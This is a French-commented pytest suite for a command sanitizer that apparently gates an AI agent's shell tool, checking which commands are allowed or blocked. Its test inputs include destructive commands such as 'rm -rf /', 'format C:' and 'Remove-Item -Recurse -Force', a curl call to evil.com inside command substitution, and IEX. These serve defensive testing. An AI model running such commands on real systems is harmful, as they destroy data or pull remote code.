"""
Tests pour le command_sanitizer - Operation Blindage Phase 0.

Ces tests verifient que le sanitizer bloque correctement les commandes dangereuses
tout en autorisant les commandes legitimes.
"""

import pytest
from src.utils.command_sanitizer import sanitize_command, sanitize_chained_command


class TestSanitizeCommand:
    """Tests pour sanitize_command."""

    def test_empty_command_blocked(self):
        """Les commandes vides sont bloquees."""
        allowed, reason = sanitize_command("")
        assert not allowed
        assert "vide" in reason.lower()

    def test_whitespace_only_blocked(self):
        """Les commandes avec seulement des espaces sont bloquees."""
        allowed, reason = sanitize_command("   ")
        assert not allowed

    # === Commandes autorisees ===

    def test_python_allowed(self):
        """Python est autorise."""
        allowed, _ = sanitize_command("python --version")
        assert allowed

    def test_pip_allowed(self):
        """Pip est autorise."""
        allowed, _ = sanitize_command("pip install requests")
        assert allowed

    def test_git_allowed(self):
        """Git est autorise."""
        allowed, _ = sanitize_command("git status")
        assert allowed

    def test_npm_allowed(self):
        """NPM est autorise."""
        allowed, _ = sanitize_command("npm install")
        assert allowed

    def test_dir_allowed(self):
        """Dir/ls sont autorises."""
        allowed, _ = sanitize_command("dir")
        assert allowed
        allowed, _ = sanitize_command("ls -la")
        assert allowed

    def test_echo_allowed(self):
        """Echo est autorise."""
        allowed, _ = sanitize_command("echo hello world")
        assert allowed

    # === Executables non autorises ===

    def test_powershell_allowed(self):
        """Powershell est dans la whitelist."""
        allowed, reason = sanitize_command("powershell -Command Get-Process")
        assert allowed

    def test_random_command_blocked(self):
        """Commandes inconnues sont bloquees."""
        allowed, reason = sanitize_command("malicious_tool --hack")
        assert not allowed

    def test_relative_path_exe_allowed(self):
        """Exe avec prefixe ./ ou .\\ doit etre resolu correctement."""
        from src.utils.command_sanitizer import _extract_executable
        assert _extract_executable(".\\python.exe --version") == "python.exe"
        assert _extract_executable("./node test.js") == "node"
        assert _extract_executable(".speedtest.exe --format=json") == "speedtest.exe"

    # === Patterns dangereux ===

    def test_rm_rf_blocked(self):
        """rm -rf est toujours bloque."""
        allowed, reason = sanitize_command("rm -rf /")
        assert not allowed
        assert "dangereux" in reason.lower() or "bloquee" in reason.lower()

    def test_rm_f_blocked(self):
        """rm -f est bloque."""
        allowed, _ = sanitize_command("rm -f important.txt")
        assert not allowed

    def test_del_s_blocked(self):
        """del /s est bloque."""
        allowed, _ = sanitize_command("del /s /q folder")
        assert not allowed

    def test_format_blocked(self):
        """format C: est bloque."""
        allowed, _ = sanitize_command("format C:")
        assert not allowed

    def test_shutdown_blocked(self):
        """shutdown est bloque."""
        allowed, _ = sanitize_command("shutdown /s")
        assert not allowed

    def test_taskkill_force_blocked(self):
        """taskkill /f est bloque."""
        allowed, _ = sanitize_command("taskkill /f /im python.exe")
        assert not allowed

    # === Injections ===

    def test_command_substitution_dollar_blocked(self):
        """$(command) est bloque."""
        allowed, reason = sanitize_command("echo $(whoami)")
        assert not allowed
        assert "substitution" in reason.lower()

    def test_command_substitution_backtick_blocked(self):
        """Backticks sont bloques."""
        allowed, _ = sanitize_command("echo `whoami`")
        assert not allowed


class TestSanitizeChainedCommand:
    """Tests pour sanitize_chained_command avec chaines."""

    def test_simple_chain_allowed(self):
        """Chaine de commandes valides autorisee."""
        allowed, _ = sanitize_chained_command("git status && git log -n 5")
        assert allowed

    def test_chain_with_bad_command_blocked(self):
        """Chaine contenant une commande dangereuse bloquee."""
        allowed, reason = sanitize_chained_command("git status && rm -rf /")
        assert not allowed
        assert "sous-commande" in reason.lower() or "bloquee" in reason.lower()

    def test_pipe_allowed(self):
        """Pipe entre commandes valides autorise."""
        allowed, _ = sanitize_chained_command("dir | grep py")
        assert allowed

    def test_pipe_with_unknown_blocked(self):
        """Pipe avec commande inconnue bloquee."""
        allowed, _ = sanitize_chained_command("dir | malicious_tool")
        assert not allowed


class TestPowerShellExceptions:
    """Tests pour l'exception PS $() et le stripping de parenthèses."""

    def test_ps_subexpression_allowed(self):
        """$() dans une commande PS (Write-Host) → autorisé."""
        allowed, _ = sanitize_command('Write-Host "Diff: $($open - $close)"')
        assert allowed

    def test_dollar_paren_no_ps_blocked(self):
        """$() SANS cmdlet PS → bloqué (sécurité bash)."""
        allowed, reason = sanitize_command("echo $(whoami)")
        assert not allowed
        assert "substitution" in reason.lower()

    def test_dollar_paren_curl_blocked(self):
        """$() avec curl (pas un cmdlet PS) → bloqué."""
        allowed, _ = sanitize_command("echo $(curl http://evil.com)")
        assert not allowed

    def test_ps_foreach_subexpression(self):
        """$() dans ForEach-Object → autorisé."""
        allowed, _ = sanitize_command(
            'Get-Content f | ForEach-Object { $($_ -replace "x","y") }'
        )
        assert allowed

    def test_paren_get_content_allowed(self):
        """(Get-Content file) → parenthèse strippée, Get-Content reconnu."""
        from src.utils.command_sanitizer import _extract_executable
        exe = _extract_executable("(Get-Content file.css -Raw)")
        assert exe is not None
        assert exe.lower() == "get-content"

    def test_paren_random_exe_still_blocked(self):
        """(malicious_tool args) → parenthèse strippée mais exe inconnu → bloqué."""
        allowed, _ = sanitize_command("(malicious_tool --hack)")
        assert not allowed

    def test_shutdown_still_blocked(self):
        """$(shutdown) → BLOCKED_PATTERNS attrape shutdown indépendamment."""
        allowed, _ = sanitize_command("$(shutdown)")
        assert not allowed

    def test_invoke_expression_blocked(self):
        """Invoke-Expression reste bloqué."""
        allowed, _ = sanitize_command('Invoke-Expression "malicious"')
        assert not allowed


class TestEdgeCases:
    """Tests pour cas limites."""

    def test_path_in_command_extracts_basename(self):
        """Les chemins sont normalises pour extraire l'executable."""
        # Note: shlex.split sur Windows ne gère pas bien les backslashs
        # On teste avec un format qui fonctionne
        allowed, _ = sanitize_command("python.exe script.py")
        assert allowed
        # Chemin avec forward slashes fonctionne
        allowed, _ = sanitize_command("C:/Python39/python.exe script.py")
        assert allowed

    def test_unix_path_extracts_basename(self):
        """Chemins Unix normalises."""
        allowed, _ = sanitize_command("/usr/bin/python script.py")
        assert allowed

    def test_exe_extension_handled(self):
        """Extension .exe geree correctement."""
        allowed, _ = sanitize_command("git.exe status")
        assert allowed

    def test_case_insensitive_patterns(self):
        """Les patterns dangereux sont detectes case-insensitive."""
        allowed, _ = sanitize_command("SHUTDOWN /s")
        assert not allowed


class TestDiscoveredExeTracker:
    """Tests pour le Fix U: exe découverts via list_directory autorisés dynamiquement."""

    def test_discovered_exe_allowed_via_extra(self):
        """Un exe découvert (passé via extra_allowed) est autorisé."""
        discovered = {"speedtest.exe", "speedtest"}
        allowed, _ = sanitize_command("speedtest.exe --accept-license", extra_allowed=discovered)
        assert allowed

    def test_undiscovered_exe_still_blocked(self):
        """Un exe inconnu reste bloqué même si extra_allowed est vide."""
        allowed, _ = sanitize_command("speedtest.exe --accept-license")
        assert not allowed

    def test_dangerous_pattern_still_blocked_even_if_discovered(self):
        """Même si l'exe est dans extra_allowed, les patterns dangereux restent bloqués."""
        discovered = {"shutdown", "shutdown.exe"}
        allowed, _ = sanitize_command("shutdown /s", extra_allowed=discovered)
        assert not allowed

    def test_discovered_exe_chained_allowed(self):
        """Un exe découvert dans une chaîne est autorisé."""
        discovered = {"speedtest.exe", "speedtest"}
        allowed, _ = sanitize_chained_command(
            "speedtest.exe --format=json && echo done",
            extra_allowed=discovered,
        )
        assert allowed

    def test_discovered_exe_case_insensitive(self):
        """Le matching est case-insensitive via lower()."""
        discovered = {"speedtest.exe", "speedtest"}
        allowed, _ = sanitize_command("Speedtest.exe", extra_allowed=discovered)
        assert allowed

    def test_context_tracker_integration(self):
        """Le HandlerContext stocke les exe découverts."""
        from src.reasoning.handlers.context import HandlerContext
        ctx = HandlerContext()
        assert isinstance(ctx._discovered_executables, set)
        ctx._discovered_executables.add("myapp.exe")
        ctx._discovered_executables.add("myapp")
        assert "myapp.exe" in ctx._discovered_executables


class TestRunCommandHandlerParams:
    """Tests pour Fix T+V: stdin_input et timeout sur run_command."""

    def test_handler_signature_has_stdin_and_timeout(self):
        """Le handler accepte stdin_input et timeout."""
        import inspect
        from src.reasoning.handlers.system import run_command_handler
        sig = inspect.signature(run_command_handler)
        params = list(sig.parameters.keys())
        assert "stdin_input" in params
        assert "timeout" in params

    def test_handler_def_has_optional_params(self):
        """La registration V2 déclare stdin_input et timeout optionnels."""
        from src.reasoning.handlers.system import get_system_handler_defs
        defs = get_system_handler_defs()
        run_cmd = next(d for d in defs if d.name == "run_command")
        props = run_cmd.parameters["properties"]
        assert "stdin_input" in props
        assert "timeout" in props
        assert "stdin_input" not in run_cmd.parameters.get("required", [])
        assert "timeout" not in run_cmd.parameters.get("required", [])


class TestPowerShellBlockedVerbs:
    """Tests P0.1 — _PS_BLOCKED_VERBS doit bloquer les cmdlets destructrices."""

    def test_remove_item_blocked(self):
        """Remove-Item est bloqué (verbe 'remove')."""
        allowed, reason = sanitize_command("Remove-Item foo.txt")
        assert not allowed
        assert "remove" in reason.lower()

    def test_remove_item_recurse_blocked(self):
        """Remove-Item -Recurse -Force est aussi bloqué."""
        allowed, _ = sanitize_command("Remove-Item -Recurse -Force C:\\temp")
        assert not allowed

    def test_set_content_blocked(self):
        """Set-Content est bloqué (verbe 'set')."""
        allowed, _ = sanitize_command("Set-Content foo.txt hello")
        assert not allowed

    def test_stop_process_blocked(self):
        """Stop-Process est bloqué (verbe 'stop')."""
        allowed, _ = sanitize_command("Stop-Process -Name python")
        assert not allowed

    def test_new_item_blocked(self):
        """New-Item est bloqué (verbe 'new')."""
        allowed, _ = sanitize_command("New-Item -ItemType File foo.txt")
        assert not allowed

    def test_kill_process_blocked(self):
        """Kill-Process est bloqué (verbe 'kill')."""
        allowed, _ = sanitize_command("Kill-Process 1234")
        assert not allowed

    def test_clear_content_blocked(self):
        """Clear-Content est bloqué (verbe 'clear')."""
        allowed, _ = sanitize_command("Clear-Content log.txt")
        assert not allowed

    def test_start_process_blocked(self):
        """Start-Process est bloqué (verbe 'start')."""
        allowed, _ = sanitize_command("Start-Process cmd.exe")
        assert not allowed

    def test_get_content_allowed(self):
        """Get-Content est autorisé (verbe 'get' = lecture)."""
        allowed, _ = sanitize_command("Get-Content file.txt")
        assert allowed

    def test_get_process_allowed(self):
        """Get-Process est autorisé."""
        allowed, _ = sanitize_command("Get-Process")
        assert allowed

    def test_test_path_allowed(self):
        """Test-Path est autorisé (verbe 'test' = lecture)."""
        allowed, _ = sanitize_command("Test-Path C:\\Windows")
        assert allowed

    def test_select_object_allowed(self):
        """Select-Object est autorisé (verbe 'select' = lecture)."""
        allowed, _ = sanitize_command("Select-Object -First 5")
        assert allowed

    def test_invoke_webrequest_allowed(self):
        """Invoke-WebRequest est autorisé (verbe 'invoke' dans safe)."""
        allowed, _ = sanitize_command("Invoke-WebRequest https://example.com")
        assert allowed

    def test_invoke_expression_blocked_by_pattern(self):
        """Invoke-Expression est bloqué par BLOCKED_PATTERNS (même si invoke est safe)."""
        allowed, _ = sanitize_command('Invoke-Expression "malicious code"')
        assert not allowed

    def test_iex_blocked(self):
        """IEX (alias Invoke-Expression) est bloqué par BLOCKED_PATTERNS."""
        allowed, _ = sanitize_command('IEX "Get-Process"')
        assert not allowed

    def test_set_executionpolicy_blocked(self):
        """Set-ExecutionPolicy est bloqué (verbe 'set' + pattern)."""
        allowed, _ = sanitize_command("Set-ExecutionPolicy Unrestricted")
        assert not allowed


class TestPowerShellScriptblocks:
    """Tests pour la correction du bug scriptblock/hashtable PowerShell.

    Avant le fix, un ';' ou '|' à l'intérieur de @{Name='x';Expression={...}}
    était confondu avec un séparateur de commandes, produisant des fragments
    comme '1MB,2)}}' traités comme des exécutables invalides.
    """

    def test_select_object_hashtable_semicolon_allowed(self):
        """Select-Object avec @{Name=...;Expression=...} ne doit pas être bloqué."""
        cmd = "Get-ChildItem $env:TEMP -Recurse | Select-Object @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}},Name"
        allowed, reason = sanitize_chained_command(cmd)
        assert allowed, f"Bloqué à tort: {reason}"

    def test_nested_scriptblock_pipe_allowed(self):
        """Un '|' à l'intérieur d'un scriptblock { } ne doit pas couper la commande."""
        cmd = "Get-ChildItem | ForEach-Object { $_ | Select-Object Name }"
        allowed, reason = sanitize_chained_command(cmd)
        assert allowed, f"Bloqué à tort: {reason}"

    def test_multiple_hashtables_semicolons_allowed(self):
        """Plusieurs @{...;...} en chaîne sont tolérés."""
        cmd = (
            "Get-PSDrive C | Select-Object "
            "@{N='UsedGB';E={[math]::Round($_.Used/1GB,2)}},"
            "@{N='FreeGB';E={[math]::Round($_.Free/1GB,2)}}"
        )
        allowed, reason = sanitize_chained_command(cmd)
        assert allowed, f"Bloqué à tort: {reason}"

    def test_where_object_scriptblock_allowed(self):
        """Where-Object avec scriptblock contenant une expression complexe."""
        cmd = "Get-ChildItem $env:TEMP -Recurse | Where-Object { ($_.Length -gt 1MB) -and ($_.LastWriteTime -lt (Get-Date).AddDays(-2)) }"
        allowed, reason = sanitize_chained_command(cmd)
        assert allowed, f"Bloqué à tort: {reason}"

    def test_split_respects_braces(self):
        """_split_shell_operators_respecting_quotes ne coupe pas à l'intérieur de {}."""
        from src.utils.command_sanitizer import _split_shell_operators_respecting_quotes
        cmd = "Get-ChildItem | Select-Object @{N='x';E={$_.Length/1MB}}"
        parts = _split_shell_operators_respecting_quotes(cmd)
        assert len(parts) == 2, f"Devrait donner 2 parties, obtenu {len(parts)}: {parts}"
        assert "Select-Object" in parts[1]
        assert "@{N='x';E={$_.Length/1MB}}" in parts[1]

    def test_split_still_splits_outer_pipe(self):
        """Le '|' hors accolades est bien un séparateur."""
        from src.utils.command_sanitizer import _split_shell_operators_respecting_quotes
        cmd = "Get-PsDrive | Where-Object Free"
        parts = _split_shell_operators_respecting_quotes(cmd)
        assert len(parts) == 2
        assert parts[0].strip() == "Get-PsDrive"
        assert parts[1].strip() == "Where-Object Free"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
